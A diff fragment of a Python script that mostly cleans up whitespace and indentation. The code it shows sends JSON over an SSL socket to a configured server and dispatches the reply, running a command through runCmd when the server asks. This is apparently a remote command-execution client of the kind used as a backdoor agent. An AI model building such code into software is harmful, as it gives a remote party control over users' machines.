@@ -53,10 +53,6 @@ def responseDispatcher(data):
         elif json_data['cmd'] == 'cmd':
             runCmd(cmd)
 
-
-
-
-
 def sendSocketData(message):
     string_message = json.dumps(message)
     byte_message = string_message.encode('utf-8')
@@ -66,18 +62,11 @@ def sendSocketData(message):
     ssl_sock.connect((server_ip, int(server_port)))
     ssl_sock.write(byte_message)
     data = ssl_sock.recv(1024).decode()
-        if data:
-            responseDispatcher(data)
-        else:
-            pass
-        ssl_sock.close()
-        break
-
-    # except:
-    #     print("Problem with data send to server !!!")
-
+    if data:
+        responseDispatcher(data)
+    else:
+        pass
+    ssl_sock.close()
 
 if __name__ == "__main__":
-
-   
     sendSocketData(_DATA)
